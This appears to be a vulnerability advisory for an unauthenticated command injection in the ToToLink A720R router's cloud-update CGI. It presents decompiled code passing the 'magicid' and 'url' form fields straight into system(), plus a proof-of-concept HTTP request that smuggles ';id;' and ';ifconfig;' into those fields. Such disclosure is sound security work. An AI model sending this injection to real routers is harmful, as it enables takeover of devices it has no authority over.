# Command Injection Vulnerability in `magicid` and `url`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | ToToLink A720R Router                                        |
| Firmware Version     | **V4.1.5cu.614_B20230630**                                   |
| Vulnerability Type   | **Unauthenticated Command Injection**                        |
| Vulnerable Component | `cloudupdate_check` (functions using `websGetVar` for `url` & `magicid`, buffers `v15`) |
| Prerequisites        | Remote access to the device's web interface (no authentication required) |

2. Exploitation Path

```c
int __fastcall sub_402414(int a1)
{
  ...
  if ( !strncmp(Var, "3.0", 3)
    && (v3 = websGetVar(a1, "mode", "0"), v4 = atoi(v3), (v5 = v4) != 0)
    && (inifile_set_int("/var/cloudupg.ini", "INFO", "mode", v4), 
        v6 = (const char *)websGetVar(a1, "url", ""), *v6) )
  {
    inifile_set("/var/cloudupg.ini", "INFO", "url", v6);
    v7 = (const char *)websGetVar(a1, "magicid", "");
    v8 = (const char *)websGetVar(a1, "version", "");
    v9 = (const char *)websGetVar(a1, "svn", "");
    snprintf(v15, 256, "echo %s > /tmp/ActionMd5", v7);
    system(v15);
    snprintf(v15, 256, "echo %s > /tmp/DlFileUrl", v6);
    system(v15);
    ...
}
```

3. **Vulnerable Binaries:** `cloudupdate_check`.

4. 0-Day Command Injection Exploitation Path:

   - In the `cloudupdate_check` file, at line 10, `v7 = (const char *)websGetVar(a1, "magicid", "")` receives input and directly performs string concatenation without filtering sensitive characters. The result is concatenated into `system(v15)` at line 14, leading to a command injection vulnerability.

   - In the `cloudupdate_check` file, at line 7, `v6 = (const char *)websGetVar(a1, "url", "")` receives input and directly performs string concatenation without filtering sensitive characters. The result is concatenated into `system(v15)` at line 16, leading to a command injection vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/cloud_update.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 95

Var=3.0&mode=1&url=http://u/&magicid=POC123;id;&version=1.0&svn=100
Var=3.0&mode=1&url=http://u/;ifconfig;&magicid=SAFE&version=1.0&svn=100
```